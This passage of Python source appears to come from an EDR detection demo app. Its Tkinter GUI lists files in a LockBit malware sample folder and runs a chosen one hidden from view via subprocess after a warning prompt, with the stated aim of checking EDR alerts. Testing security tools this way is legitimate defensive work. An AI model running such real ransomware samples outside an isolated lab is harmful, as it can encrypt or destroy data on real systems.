        
        scrollbar = ttk.Scrollbar(listbox_frame, orient=tk.VERTICAL)
        self.file_listbox.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.file_listbox.yview)
        self.file_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        back_btn = tk.Button(self.main_frame, text="🔙 Back to Main Menu", command=self.show_main_menu, bg=theme["button_bg"], fg=theme["accent_fg"], activebackground=theme["button_active_bg"], activeforeground=theme["accent_fg"], font=(theme["font_family"], 9, 'bold'), relief='raised', bd=2, cursor='hand2')
        back_btn.pack(side=tk.BOTTOM, anchor='se', padx=10, pady=10)
        
        self.refresh_malware_list()
        self.create_theme_selector(self.main_frame)

    def refresh_malware_list(self):
        if not (hasattr(self, 'file_listbox') and self.file_listbox.winfo_exists()): return
        self.file_listbox.delete(0, tk.END)
        z_drive_path = Path(r"Z:\Malware Samples\TA Samples\Lockbit") 
        
        if not z_drive_path.exists():
            self.file_listbox.insert(tk.END, f"❌ Path not found: {z_drive_path}")
            return
        
        try:
            files = [item for item in z_drive_path.iterdir() if item.is_file()]
            if not files:
                self.file_listbox.insert(tk.END, f"📁 Directory is empty: {z_drive_path}")
            else:
                for item in files:
                    self.file_listbox.insert(tk.END, f"📄 {item.name}")
        except Exception as e:
            self.file_listbox.insert(tk.END, f"❌ Error accessing {z_drive_path}: {e}")

    def browse_for_malware(self):
        initial_dir = r"Z:\Malware Samples\TA Samples\Lockbit"
        if not Path(initial_dir).exists(): initial_dir = os.path.expanduser("~") 

        file_path = filedialog.askopenfilename(initialdir=initial_dir, title="Select Malware Sample")
        if file_path:
            self.file_listbox.delete(0, tk.END)
            self.file_listbox.insert(tk.END, f"📄 {os.path.basename(file_path)}")
            self.selected_file_path = file_path 
        elif hasattr(self, 'selected_file_path'):
                del self.selected_file_path

    def execute_selected_file(self):
        if not hasattr(self, 'file_listbox') or not self.file_listbox.winfo_exists() or not self.file_listbox.curselection():
            messagebox.showwarning("No Selection", "Please select a file to execute.")
            return

        selected_text_raw = self.file_listbox.get(self.file_listbox.curselection())
        file_path_to_execute = ""

        if hasattr(self, 'selected_file_path') and os.path.basename(self.selected_file_path) in selected_text_raw:
            file_path_to_execute = self.selected_file_path
        elif selected_text_raw.startswith("📄 "):
            filename = selected_text_raw.split(" ", 1)[1]
            file_path_to_execute = str(Path(r"Z:\Malware Samples\TA Samples\Lockbit") / filename)
        else:
            messagebox.showerror("Error", "Could not determine the file path for execution.")
            return

        if not Path(file_path_to_execute).exists():
            messagebox.showerror("File Not Found", f"The file '{file_path_to_execute}' does not exist.")
            return

        if messagebox.askyesno("⚠️ DANGER - CONFIRM EXECUTION", f"You are about to execute:\n{file_path_to_execute}\n\nThis is potentially REAL MALWARE. Proceed only in a safe, controlled environment.\n\nAre you sure?"):
            try:
                messagebox.showinfo("Execution Started", f"Execution of {os.path.basename(file_path_to_execute)} has been initiated.\nMonitor your EDR solution for detection alerts.")
                subprocess.Popen([file_path_to_execute], creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                messagebox.showerror("Execution Failed", f"Failed to execute malware: {str(e)}")
    
    # --- UTILITY METHODS ---

    def clear_terminal(self):
        terminal = getattr(self, 'ttp_terminal', None) or getattr(self, 'terminal_output', None)
        if terminal and terminal.winfo_exists():
            terminal.delete("1.0", tk.END)

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    app = BadCipherEDRDemo()
    app.run()